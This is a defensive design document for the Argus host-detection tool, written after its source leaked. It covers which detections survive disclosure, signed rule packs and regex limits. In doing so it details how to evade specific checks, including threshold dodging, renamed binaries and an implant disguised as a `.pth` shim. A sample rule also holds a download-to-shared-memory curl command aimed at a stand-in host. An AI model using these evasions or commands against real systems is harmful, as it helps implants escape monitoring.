# Detection that holds up when the source is public

Status: design adopted 2026-10-30; first slice built on branch `sec/detection-content`
(not deployed, not released). Governing contract:
[MAXIMUM-ASSURANCE](../security/MAXIMUM-ASSURANCE.md). Nothing here is a claim of
coverage; the assurance register (`jarvis/core/assurance.py`) holds the claims, and
both new capabilities are `unverified`.

## 1. What happened and what it changes

The complete source of Argus (JARVIS renamed) was downloadable from 2026-10-22 to
2026-10-29, in versions 2026.10.22 through 2026.10.30. Anyone who took a copy has, for
those versions:

- every collector, its schedule (`core/mechanisms.py`: intervals, timeouts, lanes),
  and the exact files, registry keys, units and commands it reads;
- every rule: the 170+ image-and-argument technique rules (`collectors/telemetry/techniques.py`),
  the registry rules, discovery lists, renamed-binary list, browser and interpreter lists,
  the toolchain `.pth` shim allowlist, the expected keyboard-reader list, spyware names;
- every threshold: discovery burst = 5 techniques in 600 s, DGA = 15 NXDOMAINs, command
  lines read to 4096 bytes, findings quoted to 120 characters, package-activity window
  20 minutes, sampling intervals (5 min for canaries, privacy, WSL; 90 min for `spy`);
- the self-protection design: where state lives (`~/.jarvis`), what the watchdog
  re-arms, which files are hashed and which are only stat-fingerprinted, what is
  allowlisted as Argus's own activity (its PowerShell payloads, its helpers);
- the blind-spot registers, which list in plain words what Argus cannot see.

The source does not contain: the owner's configuration, learned baselines, planted
canaries and their journal, keys, the evidence history, or anything per install.

The attacker model is therefore: **an operator who has read every line of the version
you run, and has a lab copy to test against**, but does not have your machine's state.

## 2. Which detections survive that

A detection survives disclosure when the attacker must break a stated invariant to do
the thing it guards, so knowing the check tells them only that they will be seen. It
fails when the check is a guess about what the attacker's artifact looks like, and the
source tells them which guess.

### 2.1 Robust even when known

| Detection | Why knowing it does not help |
|---|---|
| Hash-chained event log, canary journal, Argus journal (`core/eventlog.py`, `core/canary.py`, `argus/journal.py`), Rust mirror, evidence vault, OpenTimestamps anchors | Rewriting history breaks a link or contradicts an anchor held elsewhere. Limit: a chain is only as good as its last off-box anchor (blind spot T5). |
| Cross-view consistency: `hidden` / `deep_hidden` (process views that must agree), snapshot/event reconciliation, native sensor sequence and digest replay checks | Hiding from one view while appearing in another is the observable; the attacker must subvert every view at once, which in userland they cannot (kernel rootkits are blind spot S1). |
| Learned-state drift: `bootchain` (images by size/inode/ctime, hooks by hash), `sshwatch` key and config drift, `preos` measured-boot replay against an owner-advanced baseline, WSL boundary checkpoint, privacy seal, Sysmon policy baseline | The baseline is per install and not in the source. Changing the guarded thing changes the observation. |
| Canary bait (`core/canary.py`) | Placement, names and tokens are chosen at plant time on the machine and recorded only in the local journal. Knowing that canaries exist does not say which files are bait. |
| Package integrity (`pkgverify`) | Replacing a packaged binary changes its hash against the package database. Limit: a rewritten package database defeats it (in its register). |
| Posture invariants (unprivileged BPF, ptrace scope, writable system directories, mitigation defaults) | A fact of the machine, not a guess about an attacker. |
| Liveness and mutual supervision (selfcheck timer, off-box heartbeat, collector freshness) | Stopping Argus is itself the signal, provided the heartbeat receiver is off-box. |

### 2.2 Evadable once known

| Detection | How the source defeats it |
|---|---|
| Image-keyed technique rules (`techniques.RULES`) | Rename or copy the tool (the `RENAMED_WATCH` list covers only Windows binaries carrying an OriginalFileName); use an equivalent tool not in the list; reorder or quote arguments the regex does not tolerate; pad the command line past 4096 bytes. |
| Name lists: expected keyboard readers, spyware names, remote-control tools, `BROWSERS`/`INTERPRETERS` exemptions, toolchain `.pth` shim allowlist | Name the artifact after an allowed entry. The `.pth` allowlist accepts `distutils-precedence.pth` with a line mentioning `_distutils_hack`, which an implant can include. |
| Thresholds: discovery burst (5 in 600 s), DGA (15 NXDOMAINs), odd-port lists, resource anomaly cutoffs | Stay one under, or spread across windows and parents. |
| Fixed sampling cadence (T1) | Undo a change inside the known interval. |
| Self-exemptions: Argus's own scripts and helpers are excluded by name or path | Masquerade as Argus's helper, or run from its path if writable. |
| Package-window explanations (`bootchain` 20-minute window, `BOOT_PKG` regex) | Make the change during a real kernel update, or fake a log line if the log is writable. |
| Threat-intel indicator hunts | Indicators are public by nature; use fresh infrastructure. |

### 2.3 Mixed

| Detection | Robust part | Evadable part |
|---|---|---|
| `bootchain` | Drift of learned files is always reported | The severity drop inside a package window |
| `sniffing` / `keyreaders` | Holders found from `/proc` by executable identity | Which identities are "expected" |
| `memscan` (reflective PE, unbacked .NET) | Image in memory with no backing file is an invariant | Sampling interval; header-erasing loaders (T3) |
| `toolchain` `.pth` inventory | Every executable `.pth` line is listed | Severity is lowered by file name and payload regex |
| Sysmon policy | Policy drift is detected against the baseline | Which events the policy records is public, so an attacker picks unlogged ones |
| Defender/ASR posture | Facts read from the OS | The list of settings read |

## 3. Strategy

1. **Prefer invariants and behaviour over signatures.** A new detection must state the
   invariant it watches ("only root writes the system site directory", "the running code
   equals the manifest", "a process visible in one view is visible in all") and must be
   measurable without assuming the attacker's tool or name. Signature rules remain
   useful for commodity tooling, which does not read our source, and stay as the
   built-in floor.
2. **Learn per install, never per source.** Baselines, canaries, checkpoints and the
   accepted-version floor are created on the machine. Reporting what was present at the
   first observation as low inventory keeps learning from silently blessing an existing
   implant (G2).
3. **Diversity of views.** Two independent sources for the same fact (Windows and Linux
   Sysmon, `/proc` and `ps`, journal and mirror, two copies of a floor) turn a quiet
   evasion into a visible contradiction.
4. **Per-install randomness only where it costs no auditability.** Randomise what an
   auditor does not need to predict, and record it locally:
   - canary placement, names and token values (already random, journalled);
   - jitter on sampling start times, so a known interval cannot be reliably straddled
     (next step; the cadence itself stays declared in the registry);
   - not thresholds or rule logic: a randomised threshold makes a missed detection
     unreproducible and an audit unrepeatable, and an attacker can stay far below any
     band anyway.
5. **Make evasion attempts themselves observable.** A pack rule suspended for slow
   matching is reported, not silently dropped; a missing or rolled-back rule pack is a
   finding; a reset acceptance floor is a finding.
6. **Ship detection content faster than source leaks age.** Signed rule packs (section 4)
   let a new rule reach every install without a program release. They do not make rules
   secret: a pack fetched from a public site is readable by attackers too. Their value is
   speed and the ability to respond to a technique the day it is seen.
7. **Assume the source of the next version leaks too.** Nothing in this design relies on
   the secrecy of code.

## 4. Signed detection content

### 4.1 Format

A rule pack is one UTF-8 JSON document (`jarvis/core/rulepack.py` validates it):

```json
{
  "schema": "argus-rules/1",
  "version": 12,
  "issued_at": 1793404800,
  "expires_at": 1796083200,
  "rules": [
    {"id": "AR-0001", "tids": ["T1105"], "platform": "linux", "images": ["curl"],
     "pattern": "\\s-o\\s+/dev/shm/", "severity": "medium",
     "title": "download written to shared memory",
     "sample": ["/usr/bin/curl", "curl -s https://x.test/a -o /dev/shm/a"],
     "benign": [["/usr/bin/curl", "curl -s https://x.test/a -o /tmp/a"]],
     "quiet": false, "parents": []}
  ]
}
```

- Strict schema: exactly these keys, no duplicates, integers only (no floats, NaN),
  printable text, bounded lengths. Unknown keys are refused, so a later schema cannot
  be half-read by an older program.
- `version` is a monotonic integer. `expires_at - issued_at` is at most 45 days.
- Rules are data. The only kind today is a process-creation rule with the same shape as
  a built-in technique rule. Every pack rule must name at least one image (no
  image-less rules), and severity is `low`, `medium` or `high` only.
- Every rule carries a sample that must fire it and benign look-alikes that must not;
  both are checked at load (R7).

### 4.2 Signature and keys

`ssh-keygen -Y sign -n argus-rules` over the exact pack bytes; the detached armored
signature travels next to it (`rules.json.sig`). The namespace differs from releases
(`argus-release`), so a release signature can never be presented as a rules signature
or the reverse (tested).

**Decision: a separate rules key, pinned inside the signed program.** Reasons:

- Rule packs will be issued far more often than program releases, possibly from a
  less guarded routine. Theft of a rules key must not let anyone sign a program.
- The worst a rules key can do is add `high`-at-most, propose-only, image-bound rules
  that expire within 45 days: noisy, not authoritative. A release key can do anything.
- The pins (`PINNED_SIGNERS` in `core/rulepack.py`) ship inside the program, which the
  release keys sign. So release keys transitively decide which rules keys count, and a
  rules key is rotated or revoked by shipping a release. No extra trust file on disk
  for an attacker to edit.
- Jev advisory (bounded, metadata only, 2026-10-30): `separate_keys` 0.91 over
  `same_releasers` 0.08.

`PINNED_SIGNERS` is empty in this slice. No real key was created. **Until the owner
creates a rules key and pins it in a release, no pack can load and only built-in rules
run.** Verification shells out to `ssh-keygen` (no Python ed25519 in the standard
library); a host without it runs built-in rules and the selfguard collector says why.

### 4.3 Verification on the daemon

Acceptance (`rulepack.verify`), in order, any failure refusing the whole pack:

1. size cap (256 KiB), then the signature against the pinned keys and namespace;
2. schema;
3. freshness: not issued more than a day in the future (WSL clocks step), not expired;
4. floor: version lower than the highest accepted here is a rollback; the same version
   with different bytes is equivocation; both refused;
5. regex bounds (4.5) and timing;
6. samples and benign look-alikes.

Install (`rulepack.install`) writes a bundle (pack bytes and signature) and a state file
(`highest`, `digest`) each by temp file, fsync and rename, so a crash leaves the old or
the new bundle, never a mix (tested by failing the rename). A refused pack changes
nothing.

Load (`rulepack.load`) re-verifies the bundle from disk every time it changes: nothing
is trusted because it was trusted when written. It never raises; it returns one of
`builtin`, `active`, `expired`, `rejected`, `missing`, `rollback`, `no-signers`, and the
selfguard collector turns every state except `builtin` and `active` into a finding.

Fail safe means: built-in rules always run; pack rules add after them and never
replace or disable a built-in rule; any doubt about a pack drops only the pack.

The technique matcher is a hot path inside tier-0 collectors, so it never verifies
inline (`current(block=False)`): a changed bundle is verified on a background thread
while the last verified pack, still expiry-checked, keeps serving. Verification can
take up to the timing deadline; detection never waits for it (tested with a stalled
loader).

**Freeze and rollback protection.** An attacker who blocks updates keeps the host on
its current pack only until that pack expires (at most 45 days), after which pack rules
stop and a medium finding says so. An attacker who restores an older pack or deletes
the installed one is refused and reported. The accepted-version floor is kept twice:
in `~/.jarvis/rules/state.json` and in the selfguard state in the daemon database;
resetting one is reported (Jev ranked a single account-writable floor the top remaining
risk, 0.82, so this was added). Both copies are still writable by the account Argus
runs as; a root-held floor is a next step.

### 4.4 Content cannot authorize anything

- A pack is data. No field is executed, imported, templated into a command or used
  as a path.
- Pack severity is capped at `high`; `critical` is refused.
- Findings from pack rules carry `origin: "rulepack"` and a `[rule pack AR-nnnn]` title
  suffix. `response/defense.decide` never puts such a finding on the AUTO rung, whatever
  its severity or the owner's automatic-response settings; it can only be proposed
  (tested).
- A pack cannot suppress, acknowledge, lower or remove a built-in finding, and cannot
  change any threshold or allowlist.

### 4.5 Bounding the regex engine (no regex of death)

Python's `re` has no timeout and cannot be interrupted. Measured on this host
(2026-10-30, 4 KiB adversarial subjects): one `.*` costs about 46 ms; two unbounded
repeats in sequence take over 10 s; a nested quantifier is exponential. So three
layers:

1. **Static safe subset** (`check_pattern`): at most 256 characters; no backreferences,
   conditionals or atomic groups; quantifiers only over fixed single characters (no
   nested repeats, no alternation under a quantifier); no repetition inside lookarounds;
   at most two unbounded repeats. This removes the exponential cases.
2. **Timing in a child process** (`probe`): every pattern is searched against a fixed
   set of adversarial subjects built from its own literals, in
   `python -m jarvis.core.rulepack probe` with a 20 s deadline. The child re-checks the
   subset itself. Over 100 ms worst case for any rule, or a child killed at the
   deadline, refuses the pack. The polynomial cases the subset allows (two `.*`) are
   caught here without the daemon ever running them (tested). The compiled server's
   launcher allows this module as its fourth `-m` child.
3. **Runtime breaker**: a pack rule whose single search ever exceeds 250 ms is
   suspended for that pack and reported, so a command line crafted to stall the matcher
   becomes a finding rather than a stall. A suspension is visible, never silent; that it
   can turn off a pack rule is a known evasion recorded in the register.

Timing limits depend on the host. Packs should be built and checked with a ten-times
tighter limit (10 ms) on the build machine, so that a slower host has headroom.

Other bounds: 500 rules, 16 images, 8 ATT&CK ids and 8 benign samples per rule, titles
of 160 characters, samples of 1024 characters; pack rules read the same 4096 bytes of a
command line as built-in rules.

### 4.6 Distribution

`rulepack.fetch(base_url)` (written, tested, **not scheduled**):

- HTTPS only; redirects only to HTTPS; no user information, query or fragment in the
  URL;
- two fixed files, `rules.json` and `rules.json.sig`, each size-capped while reading;
- identical request from every host: fixed `User-Agent: argus-rules`, no cookies, no
  host id, version or installed pack version.

Privacy: the request reveals only that an Argus install fetched rules, plus what any
HTTPS request reveals to the site (source address, time). To blur timing, the scheduled
fetch should run with a random daily offset; installs that must not contact the site
can install a pack file copied by hand (`rulepack.install` takes bytes and a signature).

The pack is public once hosted. That is acceptable: its purpose is speed, not secrecy
(section 3, point 6).

## 5. Built in this slice

| Piece | Where | Tests |
|---|---|---|
| SSH signature check against pinned keys, own namespace | `jarvis/core/sshsig.py` | `tests/test_rulepack.py` (SignatureChecks) |
| Rule packs: schema, freshness, floor, subset, timing child, samples, atomic install, safe load, non-blocking cache, fetch | `jarvis/core/rulepack.py` | `tests/test_rulepack.py` |
| Consumer: technique matcher runs built-in then pack rules; slow pack rules suspended | `jarvis/collectors/telemetry/techniques.py` (`match`, `pack_rules`) | `tests/test_rulepack.py` (ConsumerTechniques), existing technique and Sysmon tests unchanged |
| Pack findings marked and never acted on unasked | `collectors/telemetry/sysmon.py`, `sysmon_linux/rules.py`, `response/defense.py` | `tests/test_rulepack.py` (ContentIsNotAuthority) |
| Self-protection collector `selfguard` (job, 1800 s, Linux domain, unscored) | `jarvis/collectors/host/selfguard.py`, `core/mechanisms.py`, `service/jobs.py` | `tests/test_selfguard.py`, `tests/test_mechanisms.py` |
| Probe child allowed in the compiled launcher | `release/launcher.py` | `tests/test_release_signing.py` |
| Register entries `signed_detection_content`, `self_tamper_evidence` (`unverified`) | `jarvis/core/assurance.py` | `tests/test_assurance.py`, `tests/test_selfguard.py` |
| Jev review script (metadata only) | `scripts/reviews/detection_content_advisory.py` | — |

### 5.1 The new detections, and why they survive disclosure

| Detection | Invariant | ATT&CK | Why knowing it does not help |
|---|---|---|---|
| Python startup hooks: executable `.pth`, `sitecustomize`, `usercustomize` in system and user site directories | The set and content of startup hooks change only when a package installs them | T1546 (Python startup hooks; cf. T1546.016 installer packages), T1195.001 | The technique needs a file there; the check learns content, not names, and a RECORD hash match only lowers severity. The LiteLLM 1.107.0 compromise (2026-10) persisted exactly this way. |
| System site directory writable by non-root | Only root writes it | T1546, T1574 | A fact of the filesystem. |
| Argus code against `RELEASE.json` | Running code equals the manifest; nothing unlisted; nothing non-root writable | T1562.001, T1554 | To change what Argus runs, the bytes must change. |
| Argus units and drop-ins | Learned once; change only on install or upgrade | T1543.002, T1562.001 | A drop-in that disables Argus is a new file. |
| Argus state directory writers | Only Argus's account writes it; no links out | T1562.001, T1565.001 | Ownership and reachability are kernel facts, measured live: 0664 segments inside a 0700 root are correctly not reported. |
| Rule-pack channel | Accepted packs do not vanish, roll back, expire silently or lose their floor | T1562.001 | Tampering with the channel produces a finding. |

Measured once, read-only, on this WSL host (2026-10-30) against the live release
(`/opt/jarvis/current`, 962 manifest files): 1.2 s cold, 0.08 s warm; findings: only the
first-run inventory of two system startup hooks (`distutils-precedence.pth`,
`zope.interface-6.1-nspkg.pth`). Seven Argus/JARVIS unit files learned. Not yet run in
the live daemon.

Known limits (also in the register): root can rewrite `RELEASE.json` together with the
code; learned state lives in a database the Argus account can write; `__pycache__`
bytecode of listed modules is ownership-checked but not hashed; tampering before the
first run is learned (reported once as low inventory); no attribution of who changed a
file; canary reads are not watched.

## 6. Next steps

### 6.1 Owner decisions

1. Create the rules key (ed25519, offline, passphrase-protected, separate from the
   release key) and pin its public line in `PINNED_SIGNERS` in a signed release.
2. Choose where packs are hosted on the site (a fixed HTTPS path with two static files)
   and whether hosts fetch automatically (a daily jittered job) or only by hand.
3. Add a pack build-and-sign tool (`release/`-style, standard library, runs the same
   `parse` and a 10 ms timing limit, refuses on any failure) and a CLI to install a
   pack file by hand.

### 6.2 Measurement before any promotion

- Run `selfguard` in the live daemon for a soak; confirm no false positives across a
  package upgrade (setuptools, a kernel), an Argus deploy, and a reboot.
- Sign a test pack with a throwaway key in an isolated VM, host it, fetch it, and see a
  pack rule fire on a real process event; only then consider `partial`.

### 6.3 Detections the leaked versions do not have, in order

Each is an invariant or behaviour check, not a name list.

| # | Detection | ATT&CK | Shape |
|---|---|---|---|
| 1 | `/etc/ld.so.preload` and `LD_PRELOAD` in service environments; PAM stack and PAM modules | T1574.006, T1556.003 | Learned-content drift like `selfguard` hooks; any `pam_*.so` not owned by a package is high |
| 2 | Fileless execution: processes whose `/proc/<pid>/exe` is a `memfd:` or a deleted file | T1620, T1059, T1027.011 | Invariant: long-running processes run from a file on disk; memfd execution is rare and named by the kernel |
| 3 | Root-held acceptance floor and manifest copy | T1562.001 | Keep the rule floor and release digest where the Argus account cannot write (root-owned, written by the installer), closing the main gap above |
| 4 | Canary read detection through an audit or fanotify watch where the kernel allows it (not WSL: EPERM measured) | T1005, T1552.001, T1083 | Event on read of a randomly placed bait file by any process other than Argus |
| 5 | BPF program and kernel module cross-views: programs/links via `bpf()` enumeration vs pinned objects vs loader processes; `/proc/modules` vs `/sys/module` | T1014, T1547.006 | Disagreement between views |
| 6 | Beaconing by timing (blind spot S19): periodicity and low-jitter inter-arrival per process and destination | T1071, T1573 | Behaviour, not names; robust median/MAD as the directive asks |
| 7 | Sampling jitter for every drift collector | (timing blind spot T1) | Randomised start offsets, declared bounds, recorded in the run receipt |
| 8 | Replace remaining name allowlists (toolchain `.pth` shims, expected keyboard readers) with identity: package ownership plus content hash | T1036, T1546 | Same shape as `selfguard` hooks |

### 6.4 What would make us reconsider

- If `ssh-keygen` turns out to be absent on target servers, vendor a reviewed pure
  verifier or use `cryptography` (already bundled in the compiled server) for ed25519.
- If pack authors need regex features the subset refuses, prefer adding a literal or
  token matcher (linear by construction) over widening the subset.
- If timing refusals differ between hosts in practice, move pattern timing to the
  build tool only and keep the static subset plus runtime breaker on hosts.
